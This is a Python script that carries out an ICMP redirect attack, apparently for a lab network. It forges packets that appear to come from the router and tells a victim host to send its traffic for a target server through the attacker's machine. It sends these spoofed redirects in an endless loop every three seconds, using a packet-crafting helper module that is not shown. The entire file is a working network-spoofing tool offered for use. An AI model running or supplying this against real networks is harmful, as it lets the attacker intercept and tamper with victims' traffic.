#!/usr/bin/env python3
"""
ICMP Redirect Attack using custom util.py packet crafting
"""

import sys
import time
import threading
from util import PacketCrafter, NetworkConfig

class ICMPRedirectAttacker:
    def __init__(self):
        # Use the NetworkConfig constants but override for our actual setup
        self.victim_ip = "192.168.1.10"
        self.router_ip = "192.168.1.1"
        self.attacker_ip = "192.168.1.20"
        self.target_ip = "10.0.0.100"  # Our actual external server
        
        print(f"[*] ICMP Redirect Attacker using custom packet crafting")
        print(f"[*] Victim: {self.victim_ip}")
        print(f"[*] Router: {self.router_ip}")
        print(f"[*] Attacker: {self.attacker_ip}")
        print(f"[*] Target: {self.target_ip}")

    def create_fake_original_packet(self):
        """Create a fake original packet that victim would send to target"""
        try:
            # Create IP header for victim -> target
            ip_header = PacketCrafter.create_ip_header(
                src_ip=self.victim_ip,
                dst_ip=self.target_ip,
                protocol=NetworkConfig.IPPROTO_ICMP,
                payload_length=8,  # ICMP header size
                identification=0x1234
            )
            
            # Create ICMP ping packet
            icmp_packet = PacketCrafter.create_icmp_packet(
                packet_type=NetworkConfig.ICMP_ECHO_REQUEST,
                code=0,
                identifier=0x1234,
                sequence=1
            )
            
            return ip_header, icmp_packet[:8]  # Only first 8 bytes for redirect
            
        except Exception as e:
            print(f"[!] Error creating fake original packet: {e}")
            return None, None

    def send_icmp_redirect(self):
        """Send ICMP redirect packet using raw socket crafting"""
        try:
            print(f"[*] Crafting ICMP redirect packet...")
            
            # Create fake original packet
            orig_ip_header, orig_data = self.create_fake_original_packet()
            if not orig_ip_header or not orig_data:
                print(f"[!] Failed to create original packet")
                return False
            
            # Create ICMP redirect payload
            icmp_redirect = PacketCrafter.create_icmp_redirect_packet(
                gateway_ip=self.attacker_ip,
                original_ip_header=orig_ip_header,
                original_data=orig_data
            )
            
            # Create IP header for redirect packet (router -> victim)
            ip_header = PacketCrafter.create_ip_header(
                src_ip=self.router_ip,
                dst_ip=self.victim_ip,
                protocol=NetworkConfig.IPPROTO_ICMP,
                payload_length=len(icmp_redirect),
                identification=0x5678
            )
            
            # Combine IP header + ICMP redirect
            complete_packet = ip_header + icmp_redirect
            
            print(f"[*] Sending ICMP redirect:")
            print(f"    From: {self.router_ip} (pretending to be router)")
            print(f"    To: {self.victim_ip}")
            print(f"    New gateway: {self.attacker_ip} for {self.target_ip}")
            
            # Send the packet
            PacketCrafter.send_raw_packet(complete_packet, self.victim_ip)
            
            print(f"[+] ICMP redirect sent successfully!")
            return True
            
        except Exception as e:
            print(f"[!] Error sending ICMP redirect: {e}")
            return False

    def continuous_attack(self):
        """Send ICMP redirects continuously"""
        print(f"\n" + "="*60)
        print(f"Starting ICMP Redirect Attack with Raw Sockets")
        print(f"="*60)
        
        try:
            count = 0
            while True:
                count += 1
                print(f"\n[*] Attack round {count}")
                
                if self.send_icmp_redirect():
                    print(f"[+] Round {count} completed successfully")
                else:
                    print(f"[!] Round {count} failed")
                
                print(f"[*] Waiting 3 seconds before next attack...")
                print("-" * 50)
                time.sleep(3)
                
        except KeyboardInterrupt:
            print(f"\n[*] Attack stopped by user after {count} rounds")

def main():
    print("ICMP Redirect Attack with Custom Packet Crafting")
    print("=" * 50)
    
    attacker = ICMPRedirectAttacker()
    attacker.continuous_attack()

if __name__ == "__main__":
    main()
